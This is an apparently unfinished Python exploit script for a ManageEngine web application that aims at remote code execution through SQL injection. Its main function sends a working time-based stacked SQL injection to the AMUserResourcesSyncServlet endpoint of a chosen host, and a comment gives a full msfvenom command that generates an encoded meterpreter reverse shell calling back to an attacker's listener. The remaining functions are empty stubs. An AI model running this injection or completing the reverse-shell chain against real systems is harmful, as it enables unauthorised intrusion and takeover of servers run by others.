"""
Author: Aleksa Zatezalo.
Date: September 2024.
Title: Managed Engine RCE.
Description: An RCE for the Manged Engine Web Application via SQL.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



# Functions to generate shell code and execute SQLi
def revShell(lhost, lport):
	"""
	Uses the variables lhost and lport to create a meterpreter reverse shell. 	
	"""
	
    # msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.45.159 LPORT=4444 -e x86/shikata_ga_nai -f vbs

	pass

def encodeSQLI(shell):
	"""
	Creates an encoded reverse shell that can be pasted at the end of a SQLi injection.
	"""
	pass

def sendRequest():
	"""
	"""
	pass


# Functions that open a port and executes commands
def openSocekt():
	"""
	"""
	pass

def command():
	"""
	"""
	pass


def main():
	if len(sys.argv) != 2:
		print("(+) usage %s <target>" % sys.argv[0])
		print ("(+) eg: %s target" % sys.argv[0])
		sys.exit(1)
	
	t = sys.argv[1]
	
	sqli = ";select+pg_sleep(10);"

	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print(r.text)
	print(r.headers)

if __name__ == '__main__':
	main()